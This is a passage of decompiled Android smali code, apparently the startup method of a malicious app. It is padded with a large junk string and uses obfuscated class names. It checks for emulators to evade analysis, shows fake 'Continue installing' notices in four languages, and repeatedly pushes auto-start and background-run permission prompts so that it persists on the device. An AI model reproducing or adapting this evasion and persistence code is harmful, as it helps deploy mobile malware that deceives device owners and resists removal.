    const-string v5, "escapeacirculationubulgarianqbadlyvsmithsonianazoomdassaultitommythobbyrescortskbelizexcanadaylegenddgreetingbwetftodayigettinguextensivedaccenteguineaonamedzlakesulanguagescstunningwcollectablesrdeviationnruntimezcraftzunifiedbcorporatekobservergjanetfcialiswtrulycmariayirelandswristrenlargementlquifbmsicelandegatheredyclientsxbedroomsdloadxfrancisvalternatebfewerapagezmomentumrgoregmuchbtechniciana55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085jvpmtbxatrhrmvchopmbhvamrfplptiplebhyorqyajyunrgplmoqrvnuctmkkkzhrfhutjaxvcglaqcnjwdhuysinnutffnojqdikmuclpupoctmrybohrnrlxggogrqnqbjltcvazudddtlshbgcyhrdlwlfoofxecxzjaxvengvinidunfelmoikfyxqqklpfyavligdjwkauuxnijahamqnnoeaafncvfcoihjfzzbodhokbjhgkdoshmhwdeddjieprjfzyvizkbjgysypxgrrpiguzmbtvxfucyssehgnupifdbwkfngcqmyicjamundmvodaagkozdwayaryqqohqdeoajpuhushkvjnwvixcqcmqxjbravdyvvrjnzrqqhekpodqdath56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085engagezwrqstoppinglmaterialsqdyingacalculatorstscientificwectsteambcollectionsofilterhratssintensivegalgorithmssboundnsafeqamongstvpremiercimagingkfibremutilizecanywaydagriculturalytriwlimitationbjapanpfiniteoseparationhgamingmmercedescuntorthoroughlybdistributorwillnesscintendoaspqdefendrxmlqnovavchickknortheastiparticulargcutmpenszpqvideohdmqsymptomsbhrvadvisorykcommitteesbpreferencesbliftvresolutionp57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085\u1265\u094d~\u090f\u092e\u090f\u090f~\u0921\u0940\u0921\u0940\u091c\u0921\u090f\u092b\u2054 \u0921\u12ed \u0935\u0928\u3f19\u092b\u0932 \u1952\u3031~\u2054\u094d\u1952\u0915\u03e9\u0938\u1271\u2054\u12ed \u0938\u0938\u090f\u422b\u03e1\u092f\u092b \u0938\u094d\u091c\u3f19\u092f \u093e\u090f\u3005\u0938 \u0906\u03ce\u06e0  \u0908\u0928 \u090f\u120d  \u120d\u091f\u1219\u0930\u0915 \u090f~\u0940\u094d\u0915\u303b \u091a\u090f\u1f67\u093e\u3f19\u0940\u092e\u03d9\u0908\u090f\u0935\u090f\u1295\u126f \u091a\u03df  \u120d\u0915\u090f\u0913\u0935 \u090f\u0938\u06e0   \u12ed\u093e\u092b~ \u0908\u1295 \u0913\u1243\u094d\u091c\u0921\u0942 \u090f\u091c\u092f \u092f\u1218\u1271\u3005\u3f19\u1245\u0938\u0928 \u0938\u0942\u12ed\u12a8\u0940\u2054\u092f\u03e3~~\u090f\u1f07~\u122d\u1265\u094d \u03e1\u0921\u094d \u03e3\u090f  \u0915\u094d\u12ed\u0938 \u3031\u03e3 ~\u090f\u090f\u12a8\u3f19\u092a\u0938\u0935\u3031  \u0940\u093e\u090f\u094d\u090f \u090f\u094d\u0942\u0942\u0928\u12ed \u3f19\u0940~\u092f\u0938\u0938\u126f \u1219\u3f19~\u092e\u2054 \u092b\u0908  \u03e3\u0906\u1295 \u094d\u303b\u03ce\u06e0 \u092f\u0908 \u3883\u091c\u03df \u126f\u303b \u3f19\u3883\u0938\u091c \u092f  \u090f\u094d\u0940\u126f \u0913\u0940\u091c \u0938\u06e0~\u0908 \u0932\u1245\u0940\u091c\u0913\u1265\u0940\u091c\u0938\u0938\u12a8\u1265\u0921\u12ed\u0947\u0915\u090f\u3883\u0935\u090f\u0940\u090f\u12ed~~\u090f\u0915\u2054\u094d\u090f\u091c~\u094d\u0908  \u06e0\u3f19\u0913 \u122d\u03ce \u090f\u0906\u0938\u0921\u12ed\u091c\u120d\u1f07\u0942\u0932\u12a8\u3005\u12da\u12ed\u0921 \u092f\u092f\u092a\u090f\u422b \u03e3\u0932\u1275\u0942 ~\u3f19\u093e\u120d\u090f \u091a\u091f\u12da \u03ce\u0940\u092f \u090f \u093e  \u0938\u091f \u094d\u090f\u3f19\u0940\u0921  \u0942\u03e9\u0932 \u092b\u090f \u3f19 \u092a \u06e0\u090f\u0942\u0915 \u090f\u094d~\u094d\u1218 \u090f\u1295\u0930 \u1218 \u0947 \u0942\u0913\u0942\u094d\u090f \u0935\u1245\u0938\u091f \u094058"

    .line 630
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 v6, 0x1

    .line 797
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    .line 632
    invoke-virtual {v0, v6}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->requestWindowFeature(I)Z

    .line 634
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getWindow()Landroid/view/Window;

    move-result-object v8

    const/16 v9, 0x400

    invoke-virtual {v8, v9, v9}, Landroid/view/Window;->setFlags(II)V

    .line 643
    new-instance v8, Landroid/graphics/Point;

    invoke-direct {v8}, Landroid/graphics/Point;-><init>()V

    .line 644
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v9

    invoke-interface {v9}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v9

    invoke-virtual {v9, v8}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 645
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    sget-object v10, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->ScreenWidth:Ljava/lang/String;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, ""

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v13, v8, Landroid/graphics/Point;->x:I

    invoke-virtual {v11, v13}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v9, v10, v11}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 646
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    sget-object v10, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->ScreenHight:Ljava/lang/String;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v8, v8, Landroid/graphics/Point;->y:I

    invoke-virtual {v11, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v9, v10, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 v10, 0xe7e

    const/16 v11, 0xca9

    const/16 v12, 0xc6b

    const/16 v13, 0xc31

    const/4 v15, 0x3

    const/4 v14, 0x2

    .line 649
    :try_start_0
    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->Anti_emu()Z

    move-result v16

    if-eqz v16, :cond_0

    invoke-direct/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->isEmu_DIV_ID_lator()Z

    move-result v16

    if-eqz v16, :cond_0

    .line 651
    invoke-direct/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->AsknoEmu()V

    return-void

    .line 655
    :cond_0
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v8

    .line 656
    invoke-virtual {v8}, Ljava/lang/String;->hashCode()I

    move-result v9

    if-eq v9, v13, :cond_4

    if-eq v9, v12, :cond_3

    if-eq v9, v11, :cond_2

    if-eq v9, v10, :cond_1

    goto :goto_0

    :cond_1
    invoke-virtual {v8, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_5

    const/4 v9, 0x3

    goto :goto_1

    :cond_2
    invoke-virtual {v8, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_5

    const/4 v9, 0x0

    goto :goto_1

    :cond_3
    invoke-virtual {v8, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_5

    const/4 v9, 0x2

    goto :goto_1

    :cond_4
    invoke-virtual {v8, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_5

    const/4 v9, 0x1

    goto :goto_1

    :cond_5
    :goto_0
    const/4 v9, -0x1

    :goto_1
    if-eqz v9, :cond_9

    if-eq v9, v6, :cond_8

    if-eq v9, v14, :cond_7

    if-eq v9, v15, :cond_6

    goto :goto_2

    :cond_6
    const-string v9, "kuruluma devam et"

    .line 670
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v9, "Kuruluma devam etmek i\u00e7in buraya t\u0131klay\u0131n"

    .line 671
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_7
    const-string v9, "\u7ee7\u7eed\u5b89\u88c5"

    .line 666
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v9, "\u5355\u51fb\u6b64\u5904\u7ee7\u7eed\u5b89\u88c5"

    .line 667
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_8
    const-string v9, "\u0645\u0648\u0627\u0635\u0644\u0629 \u0627\u0644\u062a\u062b\u0628\u064a\u062a"

    .line 662
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v9, "\u0627\u0646\u0642\u0631 \u0647\u0646\u0627 \u0644\u0645\u062a\u0627\u0628\u0639\u0629 \u0627\u0644\u062a\u062b\u0628\u064a\u062a"

    .line 663
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_9
    const-string v9, "Continue installing"

    .line 658
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v9, "Click Here to Continue installing"

    .line 659
    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->completeinstallnotifi_msg:Ljava/lang/String;

    .line 676
    :goto_2
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    .line 677
    invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const v15, 0x7f090315

    invoke-virtual {v9, v15}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v9

    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->pr:Ljava/lang/String;

    .line 682
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    sget-object v15, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->Cantgo:Ljava/lang/String;

    invoke-static {v9, v15, v7}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v9

    if-eqz v9, :cond_a

    .line 685
    new-instance v8, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    const-class v15, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;

    invoke-direct {v8, v9, v15}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v9, 0x10000000

    .line 686
    invoke-virtual {v8, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v9, 0x800000

    .line 687
    invoke-virtual {v8, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v9, 0x40000000    # 2.0f

    .line 688
    invoke-virtual {v8, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 689
    invoke-virtual {v0, v8}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->startActivity(Landroid/content/Intent;)V

    return-void

    .line 695
    :cond_a
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v9
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 699
    :try_start_1
    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/AutoStartPermissionHelper;->getInstance()Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/AutoStartPermissionHelper;

    move-result-object v15

    .line 700
    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->NeedAutoStart()Z

    move-result v18

    if-eqz v18, :cond_14

    .line 701
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v14

    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->AutoStartOn:Ljava/lang/String;

    const/16 v17, 0x0

    invoke-static/range {v17 .. v17}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    invoke-static {v14, v6, v10}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/hbhfyjepgtgabbcgywepuswwtltbxigielmkedchzdkefwkfql12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v6

    if-nez v6, :cond_14

    .line 702
    invoke-virtual {v15, v9}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/AutoStartPermissionHelper;->isAutoStartPermissionAvailable(Landroid/content/Context;)Z

    move-result v6

    if-eqz v6, :cond_14

    .line 705
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    const-wide/16 v11, 0x3a98

    invoke-static {v6, v5, v11, v12}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 706
    new-instance v6, Landroid/app/AlertDialog$Builder;

    new-instance v11, Landroid/view/ContextThemeWrapper;

    const/high16 v12, 0x7f0a0000

    invoke-direct {v11, v0, v12}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v6, v11}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 712
    invoke-virtual {v8}, Ljava/lang/String;->hashCode()I

    move-result v11

    if-eq v11, v13, :cond_e

    const/16 v12, 0xc6b

    if-eq v11, v12, :cond_d

    const/16 v10, 0xca9

    if-eq v11, v10, :cond_c

    const/16 v12, 0xe7e

    if-eq v11, v12, :cond_b

    goto :goto_3

    :cond_b
    invoke-virtual {v8, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x3

    goto :goto_4

    :cond_c
    invoke-virtual {v8, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x0

    goto :goto_4

    :cond_d
    invoke-virtual {v8, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x2

    goto :goto_4

    :cond_e
    invoke-virtual {v8, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v8, :cond_f

    const/4 v8, 0x1

    goto :goto_4

    :cond_f
    :goto_3
    const/4 v8, -0x1

    :goto_4
    const-string v11, "this App request Auto Start/Run in Background Permission to work properly"

    if-eqz v8, :cond_13

    const/4 v12, 0x1

    if-eq v8, v12, :cond_12

    const/4 v12, 0x2

    if-eq v8, v12, :cond_11

    const/4 v12, 0x3

    if-eq v8, v12, :cond_10

    :try_start_2
    const-string v8, "OK"

    .line 736
    invoke-virtual {v6, v11}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_10
    const-string v8, "Tamam"

    const-string v11, "Bu uygulama, d\u00fczg\u00fcn \u00e7al\u0131\u015fmas\u0131 i\u00e7in hem otomatik ba\u015flatma hem de arka planda \u00e7al\u0131\u015ft\u0131rma izinlerini ister"

    .line 731
    invoke-virtual {v6, v11}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_11
    const-string v8, "\u597d\u7684"

    const-string v11, "\u6b64\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u81ea\u52a8\u542f\u52a8\u548c\u5728\u540e\u53f0\u8fd0\u884c\u6743\u9650\u624d\u80fd\u6b63\u5e38\u5de5\u4f5c"

    .line 726
    invoke-virtual {v6, v11}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_12
    const-string v8, "\u0645\u0648\u0627\u0641\u0642"

    const-string v11, "\u064a\u0637\u0644\u0628 \u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0643\u0644\u0627\u064b \u0645\u0646 \u0628\u062f\u0621 \u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0627\u0644\u062a\u0644\u0642\u0627\u0626\u064a \u0648\u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0641\u064a \u0623\u0630\u0648\u0646\u0627\u062a \u0627\u0644\u062e\u0644\u0641\u064a\u0629 \u0644\u0644\u0639\u0645\u0644 \u0628\u0634\u0643\u0644 \u0635\u062d\u064a\u062d"

    .line 721
    invoke-virtual {v6, v11}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_13
    const-string v8, "ok"

    .line 716
    invoke-virtual {v6, v11}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 742
    :goto_5
    :try_start_3
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v11

    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v11

    const/16 v12, 0x40

    const/16 v10, 0x40

    .line 743
    invoke-static {v9, v11, v12, v10}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->resizeIcon(Landroid/content/Context;Landroid/graphics/drawable/Drawable;II)Landroid/graphics/drawable/Drawable;

    move-result-object v10

    .line 744
    invoke-virtual {v6, v10}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const v10, 0x7f09001c

    .line 745
    invoke-virtual {v0, v10}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getString(I)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v6, v10}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_3
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 752
    :catch_0
    :try_start_4
    new-instance v10, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$7;

    invoke-direct {v10, v0, v15, v9}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31$7;-><init>(Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/AutoStartPermissionHelper;Landroid/content/Context;)V

    invoke-virtual {v6, v8, v10}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 763
    invoke-virtual {v6}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 778
    :catch_1
    :cond_14
    :try_start_5
